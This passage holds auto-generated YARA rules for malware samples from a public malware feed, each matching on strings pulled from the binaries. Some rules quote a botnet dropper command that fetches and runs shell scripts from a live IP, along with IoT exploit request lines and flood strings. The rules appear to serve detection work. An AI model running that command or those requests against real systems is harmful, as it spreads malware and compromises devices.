        description = "Auto ML: f5e6a0b0c3587f36c025c2bb94929f8b7273f25c5ebdc6755f6a582b01cb8caa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetFiltes>b__0"
        $s5 = "PROCESSENTRY32"
        $s6 = "kernel32"
        $s7 = "Microsoft.Win32"
        $s8 = "WriteUInt64"
        $s9 = "GetAsUInt64"
        $s10 = "SetAsUInt64"
        $s11 = "<Module>"
        $s12 = "LoadLibraryA"
        $s13 = "ES_SYSTEM_REQUIRED"
        $s14 = "GetTypeFromCLSID"
        $s15 = "th32ModuleID"
        $s16 = "th32ProcessID"
        $s17 = "th32ParentProcessID"
        $s18 = "get_FormatID"
        $s19 = "get_ASCII"
        $s20 = "System.IO"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 48KB and
        all of them
}

rule Windows_f5ef6f1272125d6166ac834f0dc7d9b3a180376842d2f77364b8f9d148161fa2
{
    meta:
        description = "Auto ML: f5ef6f1272125d6166ac834f0dc7d9b3a180376842d2f77364b8f9d148161fa2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "}Geti"
        $s6 = "eGetl"
        $s7 = "<Module>"
        $s8 = "newrock.exe"
        $s9 = "Writer"
        $s10 = "System"
        $s11 = "System.Collections.Generic"
        $s12 = "fileNames"
        $s13 = "fileTypes"
        $s14 = "fileRunTypes"
        $s15 = "fileDropPaths"
        $s16 = "GetResource"
        $s17 = "WriteAllBytes"
        $s18 = "GetModuleHandle"
        $s19 = "file"
        $s20 = "fileBytes"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7176KB and
        all of them
}

rule Windows_174db77d4852579384371ddd568133a048de23035171765387ee7428cc93bc22
{
    meta:
        description = "Auto ML: 174db77d4852579384371ddd568133a048de23035171765387ee7428cc93bc22"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "KERNEL32.DLL"
        $s3 = "COMCTL32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "LoadLibraryA"
        $s9 = "GetProcAddress"
        $s10 = "DrawDibOpen"
        $s11 = "GetDC"
        $s12 = "SkinH_EL.dll"
        $s13 = "SkinH_GetColor"
        $s14 = "SkinH_SetAero"
        $s15 = "SkinH_SetBackColor"
        $s16 = "SkinH_SetFont"
        $s17 = "SkinH_SetFontEx"
        $s18 = "SkinH_SetForeColor"
        $s19 = "SkinH_SetMenuAlpha"
        $s20 = "SkinH_SetTitleMenuBar"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 409KB and
        all of them
}

rule Linux_f5fe110ad4b3c935e9b025c0597d379595413038f4a145e106f3e879ba002cca
{
    meta:
        description = "Auto ML: f5fe110ad4b3c935e9b025c0597d379595413038f4a145e106f3e879ba002cca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB and
        all of them
}

rule Windows_f621004ddaf082516c2e86ae9b0247c50309e16b09393694ebd3601a2f4d6659
{
    meta:
        description = "Auto ML: f621004ddaf082516c2e86ae9b0247c50309e16b09393694ebd3601a2f4d6659"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "get_ICeZ"
        $s7 = "System.Data"
        $s8 = "Load"
        $s9 = "set_Enabled"
        $s10 = "get_DataSource"
        $s11 = "set_DataSource"
        $s12 = "set_AutoScaleMode"
        $s13 = "set_ColumnHeadersHeightSizeMode"
        $s14 = "get_IdLotFabricatie"
        $s15 = "set_IdLotFabricatie"
        $s16 = "get_UnitateMasuraMateriale"
        $s17 = "set_UnitateMasuraMateriale"
        $s18 = "get_NumeMateriale"
        $s19 = "set_NumeMateriale"
        $s20 = "get_NrMateriale"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 636KB and
        all of them
}

rule Windows_f6503af4165e558f39c767f7df0c1b28adcd8149d64b5ac810687e1ba53daffb
{
    meta:
        description = "Auto ML: f6503af4165e558f39c767f7df0c1b28adcd8149d64b5ac810687e1ba53daffb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1608KB and
        all of them
}

rule Windows_f6957a035715b303925a5215f2f5b56933aaf0cb3307d3bf8826f2d35515c73f
{
    meta:
        description = "Auto ML: f6957a035715b303925a5215f2f5b56933aaf0cb3307d3bf8826f2d35515c73f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB and
        all of them
}

rule Windows_f6b10c59c9ce33c5c8f6b02c3293fe5d479e59542698c91b15af74bcce50ab8f
{
    meta:
        description = "Auto ML: f6b10c59c9ce33c5c8f6b02c3293fe5d479e59542698c91b15af74bcce50ab8f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = ".rsrc"
        $s4 = "Hcmds"
        $s5 = ".Hcmds)Gc"
        $s6 = "6{h(>!/s(i5/y9)ahLoaD0."
        $s7 = "msvcrt.dll"
        $s8 = "memset"
        $s9 = "getenv"
        $s10 = "fopen"
        $s11 = "fwrite"
        $s12 = "fclose"
        $s13 = "__set_app_type"
        $s14 = "__getmainargs"
        $s15 = "shell32.dll"
        $s16 = "ShellExecuteA"
        $s17 = "kernel32.dll"
        $s18 = "SetUnhandledExceptionFilter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1663KB and
        all of them
}

rule Windows_f6c152fef8121d507180919cd15337960e5b5c15c0e6ef751475558da764cb67
{
    meta:
        description = "Auto ML: f6c152fef8121d507180919cd15337960e5b5c15c0e6ef751475558da764cb67"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "?o`getgE"
        $s7 = "GetVersionExA"
        $s8 = "ExitProcess"
        $s9 = "SHELL32.dll"
        $s10 = "CreateCompatibleBitmap"
        $s11 = "GetProcAddress"
        $s12 = "KERNEL32.dll"
        $s13 = "ntdll.dll"
        $s14 = "GetSystemMetrics"
        $s15 = "USER32.dll"
        $s16 = "SETUPAPI.dll"
        $s17 = "SHLWAPI.dll"
        $s18 = "SetupDiEnumDeviceInterfaces"
        $s19 = "GetModuleHandleA"
        $s20 = "getaddrinfo"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Linux_f6f3aac7af40458bafc2936cf126642e30c71ca9997696d817cc436642c461a2
{
    meta:
        description = "Auto ML: f6f3aac7af40458bafc2936cf126642e30c71ca9997696d817cc436642c461a2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 146KB and
        all of them
}

rule Windows_f7023ac898d727474c62ce2496df6131d349bb957bfc5f88d1dbd1886defafd2
{
    meta:
        description = "Auto ML: f7023ac898d727474c62ce2496df6131d349bb957bfc5f88d1dbd1886defafd2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = ")xvMsEtVj"
        $s5 = "MsEtV?"
        $s6 = "MsEtVF"
        $s7 = ")xvMsEt&A41|"
        $s8 = "HuGetR["
        $s9 = "LsEt)"
        $s10 = "OsEtVE2?rm6G0"
        $s11 = "ui!x3MsEt:{61|KuC60PF=T`"
        $s12 = "~sETXMo"
        $s13 = "DsETX"
        $s14 = "sETU"
        $s15 = "~sETX"
        $s16 = "sETX"
        $s17 = "~sETX{d"
        $s18 = "EsETX[d"
        $s19 = "DsETX9e"
        $s20 = "sETr"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1050KB and
        all of them
}

rule Android_f7199741396138635bb8dcff3d2594927a71d9a432581987c30b98438575aefa
{
    meta:
        description = "Auto ML: f7199741396138635bb8dcff3d2594927a71d9a432581987c30b98438575aefa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "res/color/mtrl_chip_close_icon_tint.xml"
        $s2 = "META-INF/androidx.databinding_viewbinding.version3"
        $s3 = "META-INF/androidx.documentfile_documentfile.version3"
        $s4 = "META-INF/androidx.loader_loader.version3"
        $s5 = "okhttp3/internal/publicsuffix/NOTICEM"
        $s6 = "okhttp3/internal/publicsuffix/publicsuffixes.gz"
        $s7 = "''res/color/mtrl_chip_close_icon_tint.xml"
        $s8 = "Choose file"
        $s9 = "@@com.google.android.material.theme.MaterialComponentsViewInflater"
        $s10 = "delete"
        $s11 = "Delete"
        $s12 = "%d nuwe kennisgewing"
        $s13 = "%d nuwe kennisgewings"
        $s14 = "Meer as %1$d nuwe kennisgewings"
        $s15 = "Nuwe kennisgewing"
        $s16 = "asetukset"
        $s17 = "in ure, da vnesete"
        $s18 = "anje besedila, da vnesete"
        $s19 = "Luaskan setengah"
        $s20 = "Dagsetning"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 2521KB and
        all of them
}

rule Windows_f72233b9518367bd3858ba7a54c631dfcb7090b3e8dac552ca4e7928cc9ea68a
{
    meta:
        description = "Auto ML: f72233b9518367bd3858ba7a54c631dfcb7090b3e8dac552ca4e7928cc9ea68a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1424KB and
        all of them
}

rule Linux_175064bbfaf46aec266fd70963f822463695ec74bbe99b39286ef1b0b5c60564
{
    meta:
        description = "Auto ML: 175064bbfaf46aec266fd70963f822463695ec74bbe99b39286ef1b0b5c60564"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 71KB and
        all of them
}

rule Linux_f747d6c7d375568d3b4936ffb0938445ba3da2b138d059d717c8a5cbc97e6cdc
{
    meta:
        description = "Auto ML: f747d6c7d375568d3b4936ffb0938445ba3da2b138d059d717c8a5cbc97e6cdc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "user"
        $s3 = "User"
        $s4 = "shell"
        $s5 = "system"
        $s6 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s7 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s8 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s9 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s10 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s11 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s12 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s13 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s14 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s15 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s18 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s19 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
        $s20 = "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 90KB and
        all of them
}

rule Linux_f76f3d2a4869993480d8d78173440b74d79206085f27d43c2531faffe99121e6
{
    meta:
        description = "Auto ML: f76f3d2a4869993480d8d78173440b74d79206085f27d43c2531faffe99121e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 58KB and
        all of them
}

rule Windows_f7728e0ce434d6b4537af34339b06d742766e574bce6b41a698725e3b9ec7f73
{
    meta:
        description = "Auto ML: f7728e0ce434d6b4537af34339b06d742766e574bce6b41a698725e3b9ec7f73"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
    condition:
        uint32(0) == 0x52455a4d and
        filesize < 242KB and
        all of them
}

rule Linux_f7907fd93577b22ba3be2f994e445c5eb196ebc474aa99e61d30a4a4c07dca16
{
    meta:
        description = "Auto ML: f7907fd93577b22ba3be2f994e445c5eb196ebc474aa99e61d30a4a4c07dca16"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 153KB and
        all of them
}

rule Linux_f7a8ef0ae5a7e627e6918ba3c92b9fd6b1d9ee8be73ec877ab8af0ef746406a0
{
    meta:
        description = "Auto ML: f7a8ef0ae5a7e627e6918ba3c92b9fd6b1d9ee8be73ec877ab8af0ef746406a0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "user"
        $s3 = "User"
        $s4 = "shell"
        $s5 = "system"
        $s6 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s7 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s8 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s9 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s10 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s11 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s12 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s13 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s14 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s15 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s18 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s19 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
        $s20 = "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 135KB and
        all of them
}

rule Windows_f7cdedd0c2255acdeec852eac9d0f27167cc48eff1d92d34fe099f3c7f21ae9a
{
    meta:
        description = "Auto ML: f7cdedd0c2255acdeec852eac9d0f27167cc48eff1d92d34fe099f3c7f21ae9a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "user32"
        $s5 = "<Module>"
        $s6 = "CreateCompatibleDC"
        $s7 = "DeleteDC"
        $s8 = "GetDC"
        $s9 = "System.Drawing.Drawing2D"
        $s10 = "get_SizeNWSE"
        $s11 = "get_IsXP"
        $s12 = "get_PathData"
        $s13 = "get_Delta"
        $s14 = "get_IsVista"
        $s15 = "get_SelectedTab"
        $s16 = "set_SelectedTab"
        $s17 = "SetSelectedTab"
        $s18 = "get_HittedTab"
        $s19 = "set_HittedTab"
        $s20 = "get_ActiveTab"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 958KB and
        all of them
}

rule Linux_f82baaec509d26a3548aa4450f94aad8c76722b1f1d41b1efa5b9d808b26c40e
{
    meta:
        description = "Auto ML: f82baaec509d26a3548aa4450f94aad8c76722b1f1d41b1efa5b9d808b26c40e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 167KB and
        all of them
}

rule Windows_f85e153151e2d8379d57e66047fa65fff537db0f455effa92a2abb09a70e52fb
{
    meta:
        description = "Auto ML: f85e153151e2d8379d57e66047fa65fff537db0f455effa92a2abb09a70e52fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Teadlsyldb.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "IGMPMessageType"
        $s8 = "System.Collections"
        $s9 = "System.Collections.ObjectModel"
        $s10 = "SystemName"
        $s11 = "SystemDescription"
        $s12 = "SystemCapabilities"
        $s13 = "System.Security.Cryptography"
        $s14 = "System.Collections.Generic"
        $s15 = "System.IO"
        $s16 = "System.Resources"
        $s17 = "System.Globalization"
        $s18 = "System.Text"
        $s19 = "payloadPacketOrData"
        $s20 = "SerialRealTimeCommunicationSystemIii"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 877KB and
        all of them
}

rule Windows_f865504f075fc498d14904055734c4c5e70d9a852e9362414b1fff6a46fc9123
{
    meta:
        description = "Auto ML: f865504f075fc498d14904055734c4c5e70d9a852e9362414b1fff6a46fc9123"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1992KB and
        all of them
}

rule Linux_f86b41a0974788440d173afdc8eb9a2245edce873b0101c2f39941c3323770e1
{
    meta:
        description = "Auto ML: f86b41a0974788440d173afdc8eb9a2245edce873b0101c2f39941c3323770e1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "[http flood] headers: \"%s\""
        $s4 = "http"
        $s5 = "socket:"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB and
        all of them
}

rule Windows_1793b6d629599f4709ba967ebfc2e07e77bc42d07b475467fedd94c53dafafe0
{
    meta:
        description = "Auto ML: 1793b6d629599f4709ba967ebfc2e07e77bc42d07b475467fedd94c53dafafe0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Unable to resolve HTTP prox"
        $s5 = "get_Item1"
        $s6 = "kernel32"
        $s7 = "Microsoft.Win32"
        $s8 = "user32"
        $s9 = "ReadInt32"
        $s10 = "get_Item2"
        $s11 = "get_Item3"
        $s12 = "ReadInt64"
        $s13 = "ReadInt16"
        $s14 = "VaultGetItem_WIN7"
        $s15 = "VaultGetItem_WIN8"
        $s16 = "<Module>"
        $s17 = "FileHandleID"
        $s18 = "fileHandleID"
        $s19 = "lpdwProcessID"
        $s20 = "processID"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 237KB and
        all of them
}

rule Windows_f871f023c7864ce803def3b7ff3ddf709ce75f87cf9283a5ed81a3f51ab02d19
{
    meta:
        description = "Auto ML: f871f023c7864ce803def3b7ff3ddf709ce75f87cf9283a5ed81a3f51ab02d19"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "@.reloc"
        $s5 = "p::get_Description"
        $s6 = "ValueMap::get_Value"
        $s7 = "ValueMap::get_ValueMapType"
        $s8 = "ValueMap::get_Count"
        $s9 = "ValueMap::get_Item"
        $s10 = "ValueMap::get__NewEnum"
